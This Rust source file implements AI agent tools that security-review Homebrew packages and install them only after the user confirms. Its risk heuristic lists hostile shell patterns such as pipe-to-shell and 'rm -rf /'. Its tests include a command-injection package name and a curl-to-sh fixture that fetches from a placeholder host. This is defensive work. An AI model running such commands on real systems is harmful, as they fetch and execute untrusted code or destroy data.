//! Homebrew 包审查与安装:review_brew_package 拉取 formula/cask 源码做安全
//! 审查并记录审查状态;install_brew_package 仅在用户看过审查并明确确认后
//! 才执行 `brew install`。审查与安装必须分属不同轮次(guard 强制)。

use super::{ToolRegistry, ToolSpec};
use crate::paths::GQYPaths;
use anyhow::{bail, Result};
use serde_json::{json, Value};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::process::Command;
use tokio::time::{timeout, Duration};

const BREW_REVIEW_RULES: &str = include_str!("../prompts/brew-review.md");
const MAX_FILE_CHARS: usize = 24_000;
const MAX_FILES: usize = 80;
const FETCH_TIMEOUT_SECONDS: u64 = 120;
const INSTALL_TIMEOUT_SECONDS: u64 = 900;

const FORMULAE_API_BASE: &str = "https://formulae.brew.sh/api";
const CORE_FORMULA_RAW: &str =
    "https://raw.githubusercontent.com/Homebrew/homebrew-core/HEAD/Formula";
const CORE_CASK_RAW: &str = "https://raw.githubusercontent.com/Homebrew/homebrew-cask/HEAD/Casks";

pub fn register(registry: &mut ToolRegistry, paths: GQYPaths) {
    let review_paths = paths.clone();
    registry.register(ToolSpec::new(
        "review_brew_package",
        "Fetch a Homebrew formula/cask source and prepare a security review. After review, stop and ask the user whether to install; do not call install_brew_package in the same turn.",
        json!({"type":"object","properties":{"package":{"type":"string","description":"Homebrew formula or cask name, e.g. ripgrep or visual-studio-code."}},"required":["package"],"additionalProperties":false}),
        move |args| {
            let paths = review_paths.clone();
            async move { review_brew_package(args, paths).await }
        },
    ));
    let install_paths = paths.clone();
    registry.register(ToolSpec::new(
        "install_brew_package",
        "Install a Homebrew package only after review_brew_package recorded an allowed review state and the user explicitly confirmed installation in a later reply. Requires user_confirmed=true. Runs `brew install`.",
        json!({"type":"object","properties":{"package":{"type":"string","description":"Homebrew formula or cask name."},"user_confirmed":{"type":"boolean","description":"Set true only when the user explicitly confirmed installation after seeing the review."}},"required":["package","user_confirmed"],"additionalProperties":false}),
        move |args| {
            let paths = install_paths.clone();
            async move { install_brew_package(args, paths).await }
        },
    ).writes());
}

async fn review_brew_package(args: Value, paths: GQYPaths) -> Result<String> {
    let package = required(&args, "package")?;
    validate_package_name(&package)?;
    let (kind, metadata) = fetch_brew_metadata(&package).await?;
    let root = paths.cache_dir.join("brew-review").join(&package);
    if root.exists() {
        std::fs::remove_dir_all(&root)?;
    }
    std::fs::create_dir_all(&root)?;
    let fetched_by = fetch_formula_source(&package, &kind, &root).await?;
    let files = review_files(&root, &package)?;
    let risk = heuristic_risk(&files);
    let install_allowed = risk["level"] != "high";
    record_review_state(&paths, &package, &risk, install_allowed)?;
    review_result(
        &root,
        &package,
        &kind,
        &metadata,
        &fetched_by,
        files,
        &risk,
        install_allowed,
    )
}

async fn install_brew_package(args: Value, paths: GQYPaths) -> Result<String> {
    let package = required(&args, "package")?;
    if args.get("user_confirmed").and_then(Value::as_bool) != Some(true) {
        bail!("brew install requires explicit user confirmation after review: {package}")
    }
    validate_package_name(&package)?;
    let review = review_state_for_package(&paths, &package)?.ok_or_else(|| {
        anyhow::anyhow!("Homebrew package must be reviewed before install: {package}")
    })?;
    if !review["install_allowed"].as_bool().unwrap_or(false) {
        bail!("Homebrew package review did not allow install: {package}")
    }
    record_install_confirmation(&paths, &package)?;
    let review = review_state_for_package(&paths, &package)?.ok_or_else(|| {
        anyhow::anyhow!("Homebrew package must be reviewed before install: {package}")
    })?;
    let result = install_with_brew(&package).await?;
    Ok(serde_json::to_string_pretty(&json!({
        "ok": result["ok"].as_bool().unwrap_or(false),
        "package": package,
        "review": review,
        "install_result": result,
        "output_instruction": "Explain that install was allowed because review_brew_package recorded an allowed review state and the user explicitly confirmed installation. Include install success or failure concisely."
    }))?)
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_arguments)]
fn review_result(
    build_dir: &Path,
    package: &str,
    kind: &str,
    metadata: &Value,
    fetched_by: &str,
    files: Vec<Value>,
    risk: &Value,
    install_allowed: bool,
) -> Result<String> {
    if !build_dir.join(format!("{package}.rb")).is_file() {
        bail!("formula source not found in {}", build_dir.display());
    }
    Ok(serde_json::to_string_pretty(&json!({
        "ok": true,
        "package": package,
        "kind": kind,
        "build_dir": build_dir.display().to_string(),
        "fetched_by": fetched_by,
        "brew_metadata": metadata,
        "risk": risk,
        "install_allowed": install_allowed,
        "files_reviewed": files.iter().map(|file| &file["path"]).collect::<Vec<_>>(),
        "files": files,
        "review_rules": BREW_REVIEW_RULES,
        "output_instruction": "Use review_rules exactly, but omit the machine-readable decision line in the final answer. Mention risk.level and install_allowed. Do not install, build, run brew install, or ask follow-up questions unless required files are missing. If install_allowed is true, ask the user whether to install and stop."
    }))?)
}

/// 先按 formula 查,再按 cask 查;返回 (kind, 元数据)。
async fn fetch_brew_metadata(package: &str) -> Result<(String, Value)> {
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(20))
        .build()?;
    for kind in ["formula", "cask"] {
        let url = format!(
            "{FORMULAE_API_BASE}/{kind}/{}.json",
            urlencoding::encode(package)
        );
        let resp = client.get(&url).send().await?;
        if !resp.status().is_success() {
            continue;
        }
        let data: Value = resp.json().await?;
        return Ok((kind.to_string(), data));
    }
    bail!("Homebrew package not found (formula or cask): {package}")
}

/// 拉取 formula/cask 源码:优先 GitHub raw(与本地是否安装 brew 无关),
/// 失败回退本地 `brew cat`。返回实际来源描述。
async fn fetch_formula_source(package: &str, kind: &str, root: &Path) -> Result<String> {
    let (repo, subdir) = match kind {
        "cask" => ("homebrew-cask", "Casks"),
        _ => ("homebrew-core", "Formula"),
    };
    let file_name = format!("{}.rb", package.split('/').last().unwrap_or(package));
    let raw_url =
        format!("https://raw.githubusercontent.com/Homebrew/{repo}/HEAD/{subdir}/{file_name}");
    let resp = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(FETCH_TIMEOUT_SECONDS))
        .build()?
        .get(&raw_url)
        .send()
        .await;
    if let Ok(resp) = resp {
        if resp.status().is_success() {
            if let Ok(source) = resp.text().await {
                std::fs::write(root.join(&file_name), source)?;
                return Ok(format!("raw.githubusercontent.com/Homebrew/{repo}"));
            }
        }
    }
    // 回退:本地 brew cat(覆盖第三方 tap)
    let output = Command::new("brew")
        .arg("cat")
        .arg(package)
        .stdin(Stdio::null())
        .kill_on_drop(true)
        .output();
    let output = command_output_with_timeout(output, "brew cat", FETCH_TIMEOUT_SECONDS).await?;
    if !output.status.success() {
        bail!(
            "failed to fetch formula source: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }
    let source = String::from_utf8_lossy(&output.stdout);
    if source.trim().is_empty() {
        bail!("brew cat returned an empty formula source for {package}");
    }
    std::fs::write(root.join(&file_name), source.as_bytes())?;
    Ok("brew cat".to_string())
}

async fn install_with_brew(package: &str) -> Result<Value> {
    let output = Command::new("brew")
        .arg("install")
        .arg(package)
        .stdin(Stdio::null())
        .kill_on_drop(true)
        .output();
    let output =
        command_output_with_timeout(output, "brew install", INSTALL_TIMEOUT_SECONDS).await?;
    Ok(command_result("brew install", output))
}

async fn command_output_with_timeout(
    output: impl std::future::Future<Output = std::io::Result<std::process::Output>>,
    command: &str,
    timeout_seconds: u64,
) -> Result<std::process::Output> {
    match timeout(Duration::from_secs(timeout_seconds), output).await {
        Ok(output) => Ok(output?),
        Err(_) => bail!("{command} timed out after {timeout_seconds}s"),
    }
}

fn command_result(command: &str, output: std::process::Output) -> Value {
    json!({
        "ok": output.status.success(),
        "command": command,
        "exit_code": output.status.code(),
        "stdout": String::from_utf8_lossy(&output.stdout).trim(),
        "stderr": String::from_utf8_lossy(&output.stderr).trim(),
    })
}

fn review_files(build_dir: &Path, package: &str) -> Result<Vec<Value>> {
    let mut files = Vec::new();
    collect_file(build_dir, Path::new(&format!("{package}.rb")), &mut files)?;
    for entry in walk_limited(build_dir, 2)? {
        if files.len() >= MAX_FILES {
            break;
        }
        let rel = entry.strip_prefix(build_dir).unwrap_or(&entry);
        if should_review_extra_file(rel) {
            collect_file(build_dir, rel, &mut files).ok();
        }
    }
    Ok(files)
}

fn collect_file(build_dir: &Path, rel: &Path, files: &mut Vec<Value>) -> Result<()> {
    if files
        .iter()
        .any(|file| file["path"] == rel.display().to_string())
    {
        return Ok(());
    }
    let path = build_dir.join(rel);
    if !path.is_file() {
        return Ok(());
    }
    let content =
        std::fs::read_to_string(&path).unwrap_or_else(|_| "<non-utf8 file omitted>".to_string());
    let truncated = content.chars().count() > MAX_FILE_CHARS;
    let content = if truncated {
        content.chars().take(MAX_FILE_CHARS).collect::<String>()
    } else {
        content
    };
    files.push(
        json!({"path": rel.display().to_string(), "truncated": truncated, "content": content}),
    );
    Ok(())
}

fn walk_limited(root: &Path, depth: usize) -> Result<Vec<PathBuf>> {
    let mut out = Vec::new();
    fn walk(dir: &Path, depth: usize, out: &mut Vec<PathBuf>) -> Result<()> {
        if depth == 0 {
            return Ok(());
        }
        for entry in std::fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            if entry.file_type()?.is_dir() {
                walk(&path, depth - 1, out).ok();
            } else {
                out.push(path);
            }
        }
        Ok(())
    }
    walk(root, depth, &mut out)?;
    out.sort();
    Ok(out)
}

fn should_review_extra_file(path: &Path) -> bool {
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();
    matches!(
        path.extension()
            .and_then(|ext| ext.to_str())
            .unwrap_or_default(),
        "rb" | "patch" | "diff" | "sh" | "service" | "plist" | "desktop"
    ) || name.ends_with(".install")
}

fn heuristic_risk(files: &[Value]) -> Value {
    let mut findings = Vec::new();
    for file in files {
        let path = file["path"].as_str().unwrap_or_default();
        let content = file["content"].as_str().unwrap_or_default();
        let lower = content.to_ascii_lowercase();
        for pattern in [
            "curl ",
            "wget ",
            "| sh",
            "|sh",
            "eval \"$(",
            "chmod 777",
            "rm -rf /",
            "sudo ",
            "osascript",
            "launchctl",
            "systemctl",
            "no_check",
            "base64 --decode",
        ] {
            if lower.contains(pattern) {
                findings.push(json!({"file": path, "pattern": pattern}));
            }
        }
    }
    let level = if findings.iter().any(|finding| {
        finding["pattern"] == "| sh"
            || finding["pattern"] == "|sh"
            || finding["pattern"] == "rm -rf /"
    }) {
        "high"
    } else if findings.is_empty() {
        "low"
    } else {
        "medium"
    };
    json!({"level": level, "findings": findings})
}

pub fn clear_brew_review_state(paths: &GQYPaths) -> Result<()> {
    let path = brew_review_state_path(paths);
    if path.exists() {
        std::fs::remove_file(path)?;
    }
    Ok(())
}

fn record_review_state(
    paths: &GQYPaths,
    package: &str,
    risk: &Value,
    install_allowed: bool,
) -> Result<()> {
    std::fs::create_dir_all(&paths.state_dir)?;
    let mut state = load_review_state(paths)?;
    state[package] = json!({
        "package": package,
        "reviewed_at_unix": current_unix_seconds(),
        "risk": risk,
        "install_allowed": install_allowed,
        "user_confirmed_install": false,
    });
    std::fs::write(
        brew_review_state_path(paths),
        format!(
            "{}
",
            serde_json::to_string_pretty(&state)?
        ),
    )?;
    Ok(())
}

fn review_state_for_package(paths: &GQYPaths, package: &str) -> Result<Option<Value>> {
    Ok(load_review_state(paths)?.get(package).cloned())
}

fn record_install_confirmation(paths: &GQYPaths, package: &str) -> Result<()> {
    let mut state = load_review_state(paths)?;
    let Some(entry) = state.get_mut(package) else {
        bail!("Homebrew package must be reviewed before install: {package}")
    };
    entry["user_confirmed_install"] = json!(true);
    entry["user_confirmed_at_unix"] = json!(current_unix_seconds());
    std::fs::write(
        brew_review_state_path(paths),
        format!(
            "{}
",
            serde_json::to_string_pretty(&state)?
        ),
    )?;
    Ok(())
}

fn load_review_state(paths: &GQYPaths) -> Result<Value> {
    let path = brew_review_state_path(paths);
    if !path.exists() {
        return Ok(json!({}));
    }
    Ok(serde_json::from_str(&std::fs::read_to_string(path)?)?)
}

fn brew_review_state_path(paths: &GQYPaths) -> PathBuf {
    paths.state_dir.join("brew-review-state.json")
}

fn current_unix_seconds() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_secs())
        .unwrap_or(0)
}

fn validate_package_name(package: &str) -> Result<()> {
    if package.is_empty()
        || !package
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '+' | '.' | '/'))
    {
        bail!("invalid package name: {package}");
    }
    Ok(())
}

fn required(args: &Value, key: &str) -> Result<String> {
    let value = args
        .get(key)
        .and_then(Value::as_str)
        .unwrap_or_default()
        .trim();
    if value.is_empty() {
        bail!("missing required argument: {key}")
    }
    Ok(value.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validates_brew_package_names() {
        assert!(validate_package_name("ripgrep").is_ok());
        assert!(validate_package_name("visual-studio-code").is_ok());
        assert!(validate_package_name("foo;rm -rf /").is_err());
    }

    #[test]
    fn selects_extra_review_files() {
        assert!(should_review_extra_file(Path::new("foo.rb")));
        assert!(should_review_extra_file(Path::new("app.plist")));
        assert!(should_review_extra_file(Path::new("fix.patch")));
        assert!(!should_review_extra_file(Path::new("README.md")));
    }

    #[test]
    fn heuristic_risk_blocks_pipe_to_shell() {
        let files = vec![
            json!({"path":"ripgrep.rb", "content":"system \"curl https://example.test/install.sh | sh\""}),
        ];
        let risk = heuristic_risk(&files);
        assert_eq!(risk["level"], "high");
    }

    #[test]
    fn heuristic_risk_flags_network_and_no_check_as_medium() {
        let files = vec![
            json!({"path":"foo.rb", "content":"url \"http://example.test/foo.tar.gz\"\nsha256 \"no_check\""}),
        ];
        let risk = heuristic_risk(&files);
        assert_eq!(risk["level"], "medium");
    }

    #[test]
    fn review_state_records_and_clears_package() {
        let temp = tempfile::tempdir().unwrap();
        let paths = test_paths(temp.path().to_path_buf());
        let risk = json!({"level":"low", "findings": []});
        record_review_state(&paths, "foo", &risk, true).unwrap();
        let state = review_state_for_package(&paths, "foo").unwrap().unwrap();
        assert_eq!(state["install_allowed"], true);
        assert_eq!(state["user_confirmed_install"], false);
        record_install_confirmation(&paths, "foo").unwrap();
        let state = review_state_for_package(&paths, "foo").unwrap().unwrap();
        assert_eq!(state["user_confirmed_install"], true);
        clear_brew_review_state(&paths).unwrap();
        assert!(review_state_for_package(&paths, "foo").unwrap().is_none());
    }

    #[test]
    fn install_confirmation_requires_existing_review() {
        let temp = tempfile::tempdir().unwrap();
        let paths = test_paths(temp.path().to_path_buf());
        assert!(record_install_confirmation(&paths, "foo").is_err());
    }

    fn test_paths(state_dir: PathBuf) -> GQYPaths {
        GQYPaths {
            root_dir: PathBuf::new(),
            config_dir: PathBuf::new(),
            config_file: PathBuf::new(),
            skills_dir: PathBuf::new(),
            data_dir: PathBuf::new(),
            cache_dir: state_dir.join("cache"),
            state_dir,
            pictures_dir: PathBuf::new(),
            fish_hook_file: PathBuf::new(),
            bash_hook_file: PathBuf::new(),
            zsh_hook_file: PathBuf::new(),
            scripts_dir: PathBuf::new(),
            system_scripts_dir: PathBuf::new(),
        }
    }
}
